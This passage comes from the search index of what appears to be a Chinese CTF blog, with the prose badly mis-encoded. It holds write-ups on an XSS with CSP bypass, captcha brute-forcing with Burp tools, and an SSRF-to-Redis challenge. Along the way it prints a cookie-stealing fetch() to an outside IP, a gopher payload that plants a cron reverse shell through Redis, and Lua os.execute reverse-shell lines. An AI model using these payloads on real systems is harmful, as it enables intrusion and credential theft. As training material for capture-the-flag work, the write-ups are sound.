srcdoc=\u0026#34;\u0026lt;h1\u0026gt;hello\u0026lt;/h1\u0026gt;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; å¹¶ä¸”ä¸å—frame-srcçš„å½±å“ï¼Œè™½ç„¶è¿™é“é¢˜çš„CSPæ²¡æœ‰è®¾ç½®frame-srcï¼Œä½†æ˜¯å¯ä»¥æ³¨æ„ä¸€ä¸‹ï¼Œéå¸¸çš„å¥½ç”¨ã€‚\nä½†æ˜¯åœ¨è¿™é‡Œéƒ½æ²¡æœ‰è§£æã€‚\nå¯¹äº\u0026lt;iframe\u0026gt;æ ‡ç­¾çš„åˆ©ç”¨ï¼Œå¦‚ä¸‹æ–‡ç« è¯´çš„æ¯”è¾ƒæ¸…æ¥šï¼š\nhttps://blog.huli.tw/2022/04/07/iframe-and-window-open/#iframe-%E7%9A%84-csp\nè¿˜æ˜¯ä¸ä¼šå‘€ï¼Œçœ‹äº†ä¸€ä¸‹åˆ«äººçš„wpï¼Œæ˜¯åœ¨/è·¯ç”±è¿›è¡Œçš„å¼¹çª—ï¼Œå”‰ï¼Œæ€ç»´è¿˜æ˜¯å®šå¼äº†ï¼Œè¿˜æ˜¯æƒ³ç€sekaictfçš„é‚£å¥—æ‰“æ³•ï¼Œé‚£ä¹ˆå¦‚ä¸‹æ‰“ï¼ˆå¯ä»¥ç›´æ¥æ‰“srcï¼Œä¹Ÿå¯ä»¥æ‰“srcdocï¼‰ï¼š\n1 \u0026lt;iframe srcdoc=\u0026#34;\u0026lt;h1\u0026gt;hello\u0026lt;/h1\u0026gt;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; ç”¨è¿™ä¸ªpayloadï¼Œè¿˜æ˜¯ä¹‹å‰çš„æ“ä½œï¼ŒHTMLç¼–ç ï¼Œç„¶åbase64ç¼–ç ã€‚\n1 http://localhost:53447/?text=Jmx0O2lmcmFtZSBzcmNkb2M9IiZsdDtoMSZndDtoZWxsbyZsdDsvaDEmZ3Q7Jmx0O3NjcmlwdCZndDthbGVydCgxKSZsdDsvc2NyaXB0Jmd0OyImZ3Q7Jmx0Oy9pZnJhbWUmZ3Q7 æœ€åæ•ˆæœå¦‚ä¸‹ï¼š\næŠ¥é”™äº†ï¼Œé‚£ä¹ˆç°åœ¨å°±æ˜¯CSPç»•è¿‡äº†ï¼Œscript-srcè®¾ç½®ä¸ºäº†selfã€‚è¿™ä¸ªå°±æ˜¯sekaictf 2024çš„ç†Ÿæ‚‰æ“ä½œäº†ï¼Œè¿™é‡Œç›´æ¥åˆ©ç”¨404é¡µé¢æ„é€ å³å¯ï¼Œè¿˜æ˜¯é‚£ä¸ªæ“ä½œï¼Œæœ¬åœ°å¼•ç”¨ï¼Œå‰é¢é—­åˆæˆå¤šè¡Œæ³¨é‡Šç¬¦ï¼Œåé¢ç›´æ¥çš„é‚£è¡Œæ³¨é‡Šæ‰ï¼Œç•™ä¸€ä¸ªå®Œæ•´çš„jsä»£ç ï¼Œè¿˜æ˜¯ç”¨fetch()å‡½æ•°ï¼š\nç„¶åè®©iframeæ¥è‡ªå·±å¼•å…¥è¿™ä¸ªé¡µé¢ï¼š\n1 \u0026lt;iframe srcdoc=\u0026#34;\u0026lt;h1\u0026gt;hello\u0026lt;/h1\u0026gt;\u0026lt;script src=\u0026#34;/**/fetch(\u0026#39;http://47.100.223.173:2333/\u0026#39;+document.cookie)//\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; ç„¶åè¿˜æ˜¯æ²¡å¼¹æˆåŠŸï¼ŒçŒœæ˜¯ä¸æ˜¯è¿™é‡Œä¸¤ä¸ªåŒå¼•å·å¯¼è‡´ç›´æ¥å‡ºé”™äº†ï¼Œfetch()å‡½æ•°è¿˜å¯ä»¥ä½¿ç”¨åå¼•å·ï¼ˆ`ï¼‰æŒ‡å®šåœ°å€ï¼Œæ”¹æˆå¦‚ä¸‹è¿™ä¸ªå³å¯ï¼š\n1 \u0026lt;iframe srcdoc=\u0026#34;\u0026lt;h1\u0026gt;hello\u0026lt;/h1\u0026gt;\u0026lt;script src=\u0026#39;/**/fetch(`http://47.100.223.173:2333/`+document.cookie)//\u0026#39;\u0026gt;\u0026lt;/script\u0026gt;\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; ç„¶åè¿˜æ˜¯ä¹‹å‰çš„æ“ä½œï¼ŒHTMLç¼–ç ååœ¨base64ç¼–ç ï¼Œæ³¨æ„è¦æŠ“åŒ…ä¼ å‚ï¼Œå¦åˆ™æµè§ˆå™¨ä¼šurlç¼–ç ä¸€æ¬¡ï¼Œå¯¼è‡´æ— æ³•æˆåŠŸï¼š\næœ€åæˆåŠŸæ‹¿åˆ°flagï¼š\næœ€åè¯´æ˜ä¸€ä¸ªç‚¹ï¼šåœ¨å…¶ä»–é¢˜ç›®ä¸­æµ‹è¯•ï¼ŒåŒæ ·çš„æƒ…å†µï¼Œ\u0026lt;script\u0026gt;ä¸è§£æï¼Œæ”¾åœ¨\u0026lt;div\u0026gt;æ ‡ç­¾ä¸­ï¼Œåº”è¯¥åŒæ ·æ˜¯å› ä¸ºinnerHTMLï¼Œè¿™ä¸ªhintå¯ä»¥ç”¨æ¥ç»•è¿‡è¿™ä¸ªç‚¹ï¼Œå¹¶ä¸”å…¶ä»–é¢˜æµ‹è¯•ä¹Ÿæ˜¯åŒæ ·å¯ä»¥ç»•è¿‡çš„ã€‚\nâ€”â€”â€”â€”\næ€»ç»“ï¼šå¾ˆæœ‰æ„æ€çš„ä¸€é“é¢˜ï¼Œæˆ‘è¿˜å¾—ç»ƒå‘€ï¼Œè¿˜æ˜¯åº”è¯¥æƒ³åˆ°è¿˜æœ‰/è·¯ç”±æœ‰å‰ç«¯æ¸²æŸ“çš„æ“ä½œï¼Œæ€ç»´è¿˜å¾—å†å¼€ç‚¹ã€‚\néƒ¨åˆ†å‡ºé¢˜äººçš„wpï¼š\nhttps://gist.github.com/X1r0z/0c6a4323fd600a07091d6392cb9c77b5\n","date":"2025-02-17T00:19:41+08:00","permalink":"https://fupanc-w1n.github.io/p/n1ctf-junior-2025/","title":"N1CTF Junior 2025"},{"content":"éªŒè¯ç çˆ†ç ´ ç°åœ¨å¶å°”é‡åˆ°éªŒè¯ç çˆ†ç ´è¿™ä¸œè¥¿äº†ï¼Œè¿™é‡Œè¿˜æ˜¯æ¥è®°å½•ä¸€ä¸‹é…ç½®åŠä½¿ç”¨æ–¹æ³•ï¼Œä½†æ˜¯è¿™ä¸ªçˆ†ç ´æ–¹æ³•ä¹Ÿåªåœ¨ä¸€å®šæƒ…å†µä¸‹ä½¿ç”¨ã€‚\nå¯¹äºéªŒè¯ç çš„å…¶ä»–æƒ…å†µï¼Œå¯ä»¥çœ‹ä¸€çœ‹ç¬¬ä¸‰ä¸ªå‚è€ƒæ–‡ç« ã€‚\ncaptcha-killer-modified å·¥å…·é…ç½® ä¸€ä¸ªburpæ’ä»¶ï¼Œåœ°å€ï¼šhttps://github.com/f0ng/captcha-killer-modified/releases/tag/0.24.3\nå…ˆåœ¨ç»™çš„å·¥å…·åœ°å€é€‰ä¸‹è½½ä¸å¯åŠ¨burpçš„javaç‰ˆæœ¬é€‚é…çš„jaråŒ…ï¼Œæˆ‘è¿™é‡Œæ˜¯ç›´æ¥çœ‹çš„æœ¬åœ°javaç‰ˆæœ¬ï¼Œæ‰€ä»¥è¿™é‡Œç›´æ¥é€‰æ‹©java8å³å¯ï¼š\nç„¶åéœ€è¦é…ç½®ä¸€ä¸‹pythonçš„ç¯å¢ƒï¼Œè¿™é‡Œéœ€è¦å®‰è£…å¦‚ä¸‹çš„åº“ï¼š\n1 2 3 4 5 flask ddddocr Pillow==9.5.0 aiohttp==3.8.3 argparse==1.1 ç›´æ¥å°†å…¶å†™å…¥åˆ°ä¸€ä¸ªrequirements.txtæ–‡ä»¶ä¸€æ­¥ä¸‹è½½å³å¯ï¼Œè¿™é‡Œæˆ‘ç”¨çš„pythonçš„ç‰ˆæœ¬æ˜¯python3.8ï¼Œå†™å¥½åç›´æ¥å¦‚ä¸‹å®‰è£…å³å¯ï¼š\n1 pip38 install -r requirements.txt -i https://pypi.tuna.tsinghua.edu.cn/simple åé¢ä½¿ç”¨æ—¶ä¼šä½¿ç”¨å¦‚ä¸‹è„šæœ¬ï¼Œç°åœ¨å…ˆä¸è¯´ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # -*- encoding=utf-8 -*- import argparse import ddddocr from aiohttp import web ocr = ddddocr.DdddOcr() async def handle_cb(request): return web.Response(text=ocr.classification(await request.text())) app = web.Application() app.add_routes([web.post(\u0026#39;/reg\u0026#39;, handle_cb)]) if __name__ == \u0026#39;__main__\u0026#39;: web.run_app(app,host=\u0026#39;127.0.0.1\u0026#39;,port=8881) ç„¶åå°±æ˜¯åœ¨burpä¸Šé…ç½®ä¸€ä¸‹æ’ä»¶ï¼Œç›´æ¥åœ¨ä¸Šè¾¹æ æ‰¾åˆ°extensionï¼Œç„¶åå¦‚ä¸‹é…ç½®å³å¯ï¼š\nå¦‚ä¸‹å°±æ˜¯é…ç½®å¥½äº†ï¼š\nåé¢å°±ç›´æ¥ç”¨ä¸€é“é¢˜æ¥è¯´æ˜åé¢è¯¥æ€ä¹ˆç”¨ã€‚\nä¾‹é¢˜è¯´æ˜ 2024å›½åŸæ¯ez_Gallery è¿™é‡Œå°±ç®€å•è¯´è¯´éªŒè¯ç çˆ†ç ´çš„æ­¥éª¤ï¼Œåç»­çš„è§£é¢˜å°±ä¸è¯´äº†ã€‚\nå¼€é¢˜å¦‚ä¸‹ï¼š\nå¯ä»¥çœ‹å‡ºæ¥å°±æ˜¯ä¸€ä¸ªç™»å½•æ¡†+éªŒè¯ç ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹ä¸€ä¸‹è¿™ä¸ªéªŒè¯ç çš„ç”Ÿæˆæƒ…å†µï¼š\nç»æµ‹è¯•å‘ç°æ˜¯é€šè¿‡ä¸€ä¸ªurlå¯æŸ¥çœ‹ï¼Œå¹¶ä¸”è¿™é‡Œåˆ·æ–°ä¸€æ¬¡æ¢ä¸€ä¸ªéªŒè¯ç ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬ç›´æ¥å°†å…¶å‘é€ç»™burpï¼Œå¹¶ç”¨captchaæ¥è·å–:\nç„¶åå»åˆ°æ’ä»¶é¡µé¢ï¼Œç‚¹å‡»è·å–ï¼Œå¾—åˆ°éªŒè¯ç å³ä¸ºæˆåŠŸï¼ˆè¿™é‡Œè¯†åˆ«åˆ°äº†éªŒè¯ç ï¼Œä½†æ˜¯ä¸ç”¨ç®¡ï¼Œç»§ç»­è·Ÿç€åé¢èµ°å°±è¡Œï¼‰ï¼š\nç„¶åå¯åŠ¨å‰é¢çš„pythonè„šæœ¬ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # -*- encoding=utf-8 -*- import argparse import ddddocr from aiohttp import web ocr = ddddocr.DdddOcr() async def handle_cb(request): return web.Response(text=ocr.classification(await request.text())) app = web.Application() app.add_routes([web.post(\u0026#39;/reg\u0026#39;, handle_cb)]) if __name__ == \u0026#39;__main__\u0026#39;: web.run_app(app,host=\u0026#39;127.0.0.1\u0026#39;,port=8881) å†æ¥åˆ°é…ç½®çš„ä¸‹é¢éƒ¨åˆ†ï¼Œåœ¨Request templateè¾“å…¥æ¡†ä¸­å³é”®ï¼Œé€‰æ‹©ddddocræ¨¡æ¿ï¼š\nç„¶åå°†ç«¯å£æ”¹æˆæœ¬åœ°è¿è¡Œçš„ç«¯å£å¹¶ç‚¹å‡»è¯†åˆ«ï¼š\nç„¶åå°±æˆåŠŸäº†ï¼š\nç„¶åå›åˆ°åŸå…ˆç™»å½•æ¡†è¿™é‡Œï¼Œéšä¾¿è¾“å…¥å°†å…¶å‘é€åˆ°çˆ†ç ´æ¨¡å—ï¼Œå°†å¯†ç å’ŒéªŒè¯ç è®¾ç½®ä¸ºå˜é‡ï¼š\npayload1å°±æ˜¯æ­£å¸¸çš„å­—å…¸ï¼ŒPayload2å¦‚ä¸‹è®¾ç½®ï¼Œé€‰æ‹©æ‰©å±•ç”Ÿæˆï¼š\nç„¶åè¿˜å¯ä»¥è®¾ç½®ä¸€ä¸‹èµ„æºæ± ï¼Œæ³¨æ„åº”è¯¥éœ€è¦è°ƒä¸€ä¸‹çº¿ç¨‹ï¼Œæ–°å»ºä¸€ä¸ªå°±è¡Œï¼Œè¿™é‡Œæ˜¯è®¾ç½®çš„ä¸€ç§’ä¸€ä¸ªè¯·æ±‚ï¼Œé˜²æ­¢éªŒè¯ç è¢«é‡å¤ä½¿ç”¨ï¼ˆç¡®å®éœ€è¦è°ƒçº¿ç¨‹ï¼‰ï¼š\nç„¶åç‚¹å‡»startï¼Œæœ€åæˆåŠŸçˆ†ç ´å‡ºæ¥ï¼š\nåœ¨å·¥å…·çš„é…ç½®é¡µé¢æ˜¯å¯ä»¥çœ‹åˆ°è¯†åˆ«æ•ˆæœçš„ï¼š\nâ€”â€”â€”â€”â€”â€”\nä¸€èˆ¬éªŒè¯ç çˆ†ç ´é€‚ç”¨äºéªŒè¯ç æ˜¯ä¸€ä¸ªurlç”Ÿæˆçš„ï¼Œè¿˜æ˜¯å¤šå°è¯•ã€‚è¿˜æœ‰é—®é¢˜çš„è¯çœ‹å‚è€ƒæ–‡ç« ã€‚\nPKAVå·¥å…· åœ°å€ï¼šhttps://github.com/estell-yf/PKAV\nè¿™é‡Œç›´æ¥å°±æ˜¯ä¸€ä¸ªå›¾å½¢åŒ–å·¥å…·ï¼Œç›´æ¥è®²æ€ä¹ˆç”¨å§ï¼š\n[NSSCTF 3rd]NSSå½±é™¢ NSSå½±è§†ï¼Œä½ å€¼å¾—æ‹¥æœ‰\nâ€”â€”â€”â€”â€”â€”\nå¼€é¢˜ï¼Œä¿¡æ¯æ”¶é›†ï¼Œå¯ä»¥çŸ¥é“æ˜¯phpï¼Œæ‰«ç›®å½•æ‰«åˆ°www.zipï¼Œè®¿é—®æ‹¿åˆ°æºç ï¼Œç»™äº†ä¸€ä¸ªæ–‡ä»¶ï¼š\næ„Ÿè§‰æ˜¯ä¸€ä¸ªå­—å…¸ï¼Œæµ‹äº†ä¸€ä¸‹ç½‘ç«™ï¼Œåº”è¯¥æ˜¯éœ€è¦ç™»å½•çš„ï¼Œæ‰¾äº†ä¸€åœˆï¼Œåœ¨å’¨è¯¢ä¸‹æœ‰ä¸€ä¸ªtestï¼š\nç‚¹è¿›å»å°±è¡Œï¼Œè¿™æ˜¯ä¸€ä¸ªå»ºç«™æµ‹è¯•ï¼Œå¯ä»¥çœ‹åˆ°ä½œè€…ï¼Œä»¥åŠflagéƒ¨åˆ†è·¯å¾„ï¼š\nå³\n1 2 d3f4u1t /Fl4g_is_h3r3 å†æ‰«ä¸€ä¸‹è¿™ä¸ªè·¯å¾„ä¸‹çš„æ–‡ä»¶ï¼š\nè®¿é—®login.phpï¼Œå°±æ˜¯ä¸€ä¸ªç™»å½•æ¡†ï¼š\nç„¶åå¯ä»¥æ‰“å¼€éªŒè¯ç ï¼Œå‘ç°æ˜¯é€šè¿‡urlæ¥ç”Ÿæˆçš„éªŒè¯ç ï¼Œè¿™é‡Œå…ˆæ˜¯å°è¯•ç”¨captchaå·¥å…·ï¼Œç„¶åæˆåŠŸçˆ†ç ´å‡ºæ¥äº†ï¼š\nå¯†ç æ˜¯ princess! ï¼Œç™»å½•è¿›å»å°±æ‹¿åˆ°äº†flagï¼š\nâ€”â€”â€”â€”â€”â€”\nä½†è¿™é‡Œè¿˜æ˜¯ä¸»è¦è¯´æ˜PKAVå·¥å…·çš„ä½¿ç”¨ï¼š\nå¤åˆ¶éªŒè¯ç çš„urlåˆ°PKAVå·¥å…·ä¸­ï¼š\nç„¶åç¿»åˆ°ä¸‹è½½ç‚¹è¯†åˆ«æµ‹è¯•å³å¯ï¼š\nç„¶åæŠ“ç™»å½•çš„HTTPåŒ…ï¼Œå°†å…¶ä¸¢è¿›PKAVå·¥å…·ï¼š\nåˆ†åˆ«è®¾ç½®çˆ†ç ´çš„å˜é‡ä»¥åŠéªŒè¯ç æ ‡è®°ã€‚\nç„¶åè®¾ç½®å¯†ç å­—å…¸å³å¯ï¼š\nå†ç„¶ååˆ°é‡æ”¾é€‰é¡¹é¡µé¢è®¾ç½®ï¼Œæ ¹æ®å®é™…æƒ…å†µè°ƒæ•´ï¼š\nç„¶ååœ¨å‘åŒ…å™¨å¼€å§‹çˆ†ç ´å°±è¡Œï¼š\næœ€åä¹Ÿæ˜¯æˆåŠŸçˆ†ç ´å‡ºæ¥äº†ï¼š\næ€»çš„æ¥è¯´å°±æ˜¯éœ€è¦è®¾ç½®å˜ä½“ï¼ŒéªŒè¯ç è¯†åˆ«ï¼Œé‡æ”¾é€‰é¡¹ï¼Œç„¶ååœ¨å‘åŒ…å™¨å‘åŒ…å³å¯ã€‚\nä½†å…¶å®æ„Ÿè§‰ç›´æ¥ä½¿ç”¨burpæ’ä»¶å°±è¡Œäº†ï¼Œä¹Ÿæ¯”è¾ƒæ–¹ä¾¿ã€‚\nå‚è€ƒé…ç½®æ–‡ç« ï¼š\nhttps://blog.csdn.net/qq_33906495/article/details/135367789\nhttps://www.52pojie.cn/thread-1944555-1-1.html\nhttps://blog.csdn.net/weixin_39190897/article/details/86539542\n","date":"2025-02-08T15:40:19+08:00","permalink":"https://fupanc-w1n.github.io/p/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/","title":"éªŒè¯ç çˆ†ç ´"},{"content":"WEB CachedVisitor æœ‰dockerã€‚è¿™ä¸ªæ¯”èµ›æˆ‘ä¹Ÿæ²¡æœ‰æŠ¥åï¼Œä»¥ä¸ºä¸æ˜¯CTFï¼Œæ—©çŸ¥é“å°±å’Œé˜Ÿå‹æŠ¥äº†ï¼Œä¸ç„¶å°±è¿›çº¿ä¸‹äº†ğŸ¥µã€‚\nâ€”â€”â€”â€”â€”â€”â€”â€”â€”â€”\nç»™äº†dockerï¼Œç®€å•å®¡ä¸€ä¸‹dockerï¼Œæ˜¯æ‰§è¡Œçš„ä¸€ä¸ªluaè„šæœ¬ï¼Œç„¶ånginxåç«¯ã€‚\nçœ‹äº†ä¸€ä¸‹æºä»£ç ï¼š\nmain.luaï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 local function read_file(filename) local file = io.open(filename, \u0026#34;r\u0026#34;) if not file then print(\u0026#34;Error: Could not open file \u0026#34; .. filename) return nil end local content = file:read(\u0026#34;*a\u0026#34;) file:close() return content end local function execute_lua_code(script_content) local lua_code = script_content:match(\u0026#34;##LUA_START##(.-)##LUA_END##\u0026#34;) if lua_code then local chunk, err = load(lua_code) if chunk then local success, result = pcall(chunk) if not success then print(\u0026#34;Error executing Lua code: \u0026#34;, result) end else print(\u0026#34;Error loading Lua code: \u0026#34;, err) end else print(\u0026#34;Error: No valid Lua code block found.\u0026#34;) end end local function main() local filename = \u0026#34;/scripts/visit.script\u0026#34; local script_content = read_file(filename) if script_content then execute_lua_code(script_content) end end main() visit.scriptï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 ##LUA_START## local curl = require(\u0026#34;cURL\u0026#34;) local redis = require(\u0026#34;resty.redis\u0026#34;) ngx.req.read_body() local args = ngx.req.get_uri_args() local url = args.url if not url then ngx.say(\u0026#34;URL parameter is missing!\u0026#34;) return end local red = redis:new() red:set_timeout(1000) local ok, err = red:connect(\u0026#34;127.0.0.1\u0026#34;, 6379) if not ok then ngx.say(\u0026#34;Failed to connect to Redis: \u0026#34;, err) return end local res, err = red:get(url) if res and res ~= ngx.null then ngx.say(res) return end local c = curl.easy { url = url, timeout = 5, connecttimeout = 5 } local response_body = {} c:setopt_writefunction(table.insert, response_body) local ok, err = pcall(c.perform, c) if not ok then ngx.say(\u0026#34;Failed to perform request: \u0026#34;, err) c:close() return end c:close() local response_str = table.concat(response_body) local ok, err = red:setex(url, 3600, response_str) if not ok then ngx.say(\u0026#34;Failed to save response in Redis: \u0026#34;, err) return end ngx.say(response_str) ##LUA_END## å¯ä»¥çœ‹åˆ°è¿™é‡Œçš„ä»£ç è¿è¡Œï¼Œåœ¨visit.scriptæ–‡ä»¶å°±æ˜¯ä¸€ä¸ªè¿æ¥redisï¼Œç„¶åå‘é€urlè¯·æ±‚çš„è¿‡ç¨‹ã€‚\nåœ¨mian.luaä¸­ï¼Œå¯ä»¥çŸ¥é“ä¸»è¦é€»è¾‘å°±æ˜¯è¿è¡Œvisit.scriptæ–‡ä»¶ã€‚\nç„¶åå°±çœ‹é¢˜å§ã€‚\nå¼€é¢˜å¦‚ä¸‹ï¼š\nssrfï¼Œå¹¶ä¸”å¯ä»¥è¯»æ–‡ä»¶ï¼š\nä½†æ˜¯ä¸èƒ½ç›´æ¥è¯»flagï¼Œæƒé™ä¸å¤Ÿï¼š\nå…¶å®è¿™ä¸ªåœ¨dockerfileä¸­æ˜¯æœ‰è¯´æ˜çš„ï¼š\n1 2 3 4 COPY flag /flag COPY readflag /readflag RUN chmod 400 /flag RUN chmod +xs /readflag å¯ä»¥çœ‹åˆ°èµ‹äºˆæƒé™çš„æ“ä½œã€‚\nå°è¯•æ‰“redisï¼Œè¿™æ ·å…ˆç”¨dictåè®®æŸ¥çœ‹ä¸€æ¬¡redisçš„åŸºæœ¬ä¿¡æ¯ï¼š\nå¯ä»¥çœ‹åˆ°redisçš„ç‰ˆæœ¬ï¼Œè¿™é‡Œåº”è¯¥æ˜¯ä¸èƒ½æ‰“redisä¸»ä»å¤åˆ¶çš„æ¥getshellï¼Œçœ‹dockeræ–‡ä»¶ï¼Œæ˜¯éœ€è¦æ‰§è¡Œ/readflagæ–‡ä»¶æ¥è¯»å–æ–‡ä»¶çš„ã€‚\né”™è¯¯åšæ³• è¿™é‡Œæ˜¯å…ˆè¸©äº†ä¸€ä¸ªå‘çš„ï¼Œä¹Ÿæ¥è®°å½•ä¸€ä¸‹ï¼Œåç«¯æ²¡æœ‰æ‰§è¡Œä»€ä¹ˆè¯­è¨€ï¼Œæ‰€ä»¥ä¸èƒ½å†™phpæ–‡ä»¶ï¼Œè¿™é‡Œæˆ‘æƒ³ä½¿ç”¨gopheruså·¥å…·ï¼Œæ‰€ä»¥åªæœ‰ç”¨æ¥å°è¯•å†™å®šæ—¶ä»»åŠ¡æ¥åå¼¹shellï¼š\nè¿™é‡Œç®€å•æ”¹ä¸€ä¸‹payloadå³å¯ï¼Œå¼¹åˆ°2333ç«¯å£å»ï¼Œå¦‚ä¸‹ï¼š\n1 gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2469%0D%0A%0A%0A%2A/1%20%2A%20%2A%20%2A%20%2A%20bash%20-c%20%22sh%20-i%20%3E%26%20/dev/tcp/47.100.223.173/2333%200%3E%261%22%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2415%0D%0A/var/spool/cron%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A ç„¶åæŠ“åŒ…urlç¼–ç ä¸€ä¸‹å‘åŒ…ï¼š\nç„¶ååœ¨vpsä¸Šç›‘å¬ä¸€ä¸‹2333ç«¯å£ã€‚\nä½†æ˜¯ä¸€ç›´æ²¡æˆåŠŸï¼Œç„¶åå¯ä»¥ä½¿ç”¨dictåè®®æ¥çœ‹æ˜¯å¦æˆåŠŸå†™å…¥ï¼š\næŸ¥çœ‹è¿™ä¸ª1çš„å†…å®¹ï¼š\nå¯ä»¥çœ‹å‡ºæ¥å°±æ˜¯ä¸€ä¸ªåå¼¹shellçš„æ“ä½œã€‚\nåé¢ä¸€ç›´éƒ½æ‰“ä¸æˆåŠŸã€‚æƒ³äº†ä¸€ä¸‹ï¼Œä»¥ä¸ºæ˜¯ç¯å¢ƒä¸å‡ºç½‘ï¼Œä½†æ˜¯å‘ç°æ˜¯å‡ºç½‘çš„ï¼š\nç»§ç»­æƒ³ï¼Œå¯èƒ½æ˜¯å› ä¸ºç¯å¢ƒä¸­éƒ½ä¸èƒ½æ‰“å®šæ—¶ä»»åŠ¡ï¼Œåœ¨dockerfileä¸­éƒ½æ²¡æœ‰ä¸‹è½½crontabè¿™ä¸ªå‘½ä»¤ï¼š\næ‰€ä»¥æ˜¯æ‰“ä¸äº†çš„ã€‚éœ€è¦æƒ³å…¶ä»–çš„æ–¹æ³•ã€‚\nåé¢æˆ‘å°±ä¸€ç›´çœ‹æ–‡ä»¶ï¼Œæƒ³åˆ°äº†nginxé…ç½®æ˜¯å¦æœ‰çªç ´ç‚¹ï¼Œè¿™ä¸ªåŒæ ·æ˜¯åœ¨dockerä¸­ç»™äº†çš„ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 events { worker_connections 1024; } http { include mime.types; default_type application/octet-stream; sendfile on; keepalive_timeout 65; server { listen 80; server_name localhost; location / { root html; index index.html; } location /visit { default_type text/plain; content_by_lua_file /usr/local/openresty/nginx/lua/main.lua; } lua_code_cache off; } } è¿™é‡Œå…³é”®å°±æ˜¯å¦‚ä¸‹ä»£ç ï¼š\n1 lua_code_cache off; è¿™é‡Œå°†lua_code_cacheè®¾ç½®ä¸ºoffï¼Œè¯´æ˜nginxä¸ä¼šç¼“å­˜ä¹‹å‰çš„ç¼–è¯‘æ•ˆæœï¼Œä¹Ÿå°±æ˜¯æ¯æ¬¡å‘èµ·è¯·æ±‚ï¼Œnginxéƒ½ä¼šé‡æ–°ç¼–è¯‘è¿™ä¸ªluaè„šæœ¬ï¼Œä¹Ÿå°±æ˜¯main.luaæ–‡ä»¶ã€‚\nçºµè§‚main.luaæ–‡ä»¶ï¼Œå¯ä»¥å‘ç°æ˜¯å¼•ç”¨äº†visit.scriptæ–‡ä»¶çš„ï¼Œé‚£ä¹ˆç°åœ¨å°±è¿¸å‘å‡ºä¸€ä¸ªæ€è·¯ï¼Œå¯ä»¥å°è¯•è¦†ç›–visit.scriptæ–‡ä»¶ï¼Œå°†è¿™ä¸ªæ–‡ä»¶å†…å®¹æ”¹ä¸ºæ˜¯ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œçš„åœ°æ–¹ï¼Œç„¶åé‡æ–°å‘èµ·è¯·æ±‚ï¼Œå°±å¯ä»¥æ‰§è¡Œè¿™ä¸ªvisit.scriptæ–‡ä»¶ï¼Œä»è€ŒæˆåŠŸè¾¾åˆ°ä¸€æ¬¡å‘½ä»¤æ‰§è¡Œã€‚\nå†™æ–‡ä»¶çš„è¯å°±æ˜¯å‚ç…§redisä¸­çš„å†™phpæ–‡ä»¶çš„æ“ä½œã€‚\nè®©gptç»™äº†ä¸€ä¸ªå¼¹shellçš„å‘½ä»¤ï¼š\n1 ##LUA_START##os.execute(\u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/47.100.223.173/2333 0\u0026gt;\u0026amp;1\u0026#39;)##LUA_END## è¿™é‡Œæˆ‘æ˜¯å…ˆå°è¯•äº†sec_toolå·¥å…·ï¼Œä½†æ˜¯ä¸€ç›´æ‰“ä¸æˆåŠŸï¼Œè¿™é‡Œæ˜¯å¯ä»¥ç”¨gopheruså·¥å…·çš„ï¼Œä½†æ˜¯éœ€è¦æ”¹ä¸€ä¸‹ï¼Œç»“æœè¿˜æ˜¯æ²¡æ‰“é€šï¼Œçœ‹äº†ä¸€ä¸‹åˆ«äººçš„wpï¼Œç”¨çš„å¼¹shellçš„å‘½ä»¤å¦‚ä¸‹ï¼š\n1 ##LUA_START##os.execute(\u0026#34;bash -c \u0026#39;sh -i \u0026amp;\u0026gt;/dev/tcp/47.100.223.173/2333 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34;)##LUA_END## åˆæ˜¯è¿™ä¸ªåŸå› ï¼Œåé¢è¿˜æ˜¯æ³¨æ„ç”¨æ›´ç¨³å®šçš„å§ã€‚\næ‰€ä»¥ç›´æ¥ç”¨gopherusç”Ÿæˆpayloadï¼š\nè¿™é‡Œæ˜¯æ‰“çš„phpæ–‡ä»¶ï¼Œéœ€è¦æ”¹ä¸€ä¸‹payloadï¼Œgopheruæ‰“è¿™ä¸ªç”¨çš„RESPåè®®ï¼Œå­¦ssrfçš„æ—¶å€™å°±ç®€å•äº†è§£äº†ï¼ŒåŸpayloadï¼š\n1 